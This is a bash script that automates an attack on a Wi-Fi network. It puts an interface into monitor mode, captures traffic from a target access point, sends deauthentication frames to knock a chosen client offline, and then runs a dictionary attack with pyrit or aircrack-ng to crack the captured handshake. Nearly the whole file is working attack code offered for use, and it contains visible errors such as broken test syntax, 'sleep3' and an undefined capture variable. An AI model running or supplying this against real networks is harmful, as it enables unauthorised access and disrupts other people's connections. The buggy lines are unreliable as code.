#!/bin/bash
echo "           AUTO WIFI With airolib";
echo "           ======================";
echo "All variables are strict - failing is in your hands";
echo "This depends on Pyrit, AiroLib, libcap-dev";
read -p "What you want to call this: " Proj;
read -p "What Interface will you use: " Iface;
mon=$Iface'mon';
read -p "What is the friendly name of the AP: " ESSID;
read -p "what is the MAC of the AP: " BSSID;
read -p "What Channel is the AP on: " chn;

#Lets Play ball
echo "checking for Project Folder";
proj=_projs/$Proj
if [ -d $proj ];then
	echo "Clearing old Content";
	rm -rf $proj/*.*
else
	"Creating New Dir";
	mkdir $proj
fi

echo "checking wlan1mon";
airmon-ng check kill
airmon-ng start $Iface --channel $chn
echo "monitor is set on $mon";
echo "For Good Riddance we need to wait a second";
gnome-terminal -x sh -c "
	sleep 4;
	cd $proj;
	airodump-ng -c $chn --bssid $BSSID -w $proj $mon;
	"
echo "Check airoDump Manually for a Client, wait a second";
sleep 10;
read -p "Do you have a client Mac: " Client;

deauth(){
read -p "How many Deauths you want to send: " dauth;

echo "Opening new Shell for Deauth";

gnome-terminal -x sh -c "
	sleep 3;
	aireplay-ng -0 $dauth -a $BSSID -c $Client $mon;
	read -n1 -p "Press Enter to Exit" key;

	"
echo "sleeping for " $deauth
sleep $dauth;
echo "deauths send"
}
deauth;

while true; do

	read -p  "Do you want to try to Deaut Again? Yes, No. (Y/N) " ans;
	case $ans in
		y|Y )
			deauth;;
		n|N )
			break;;
		* ) echo "Please answer yes or no.";;
	esac
done

echo "looking for wordlist and starting attack"


dic=wordlist/export.db

if [-e wordlist/*.db ]; then
	echo "Loading dictionary"

	gnome-terminal -x sh -c "
		cd $proj;
		sleep3;
		pyrit eval;
		sleep3;
		cap='find *.cap';
		echo "ready to analyze  " $cap
		pyrit -r $cap analyze;
		read -n1 -p "Press Enter to Exit" key;
	"
else
	read -p "do you have a wordlist ready? Path: " dic;

gnome-terminal -x sh -c "
        sleep 3;
        aircrack-ng -w  $dic -b $BSSID $cap;
        "
echo "Hope you were lucky!!!!"
read -n1 -p "Press Enter to Exit" key;

fi
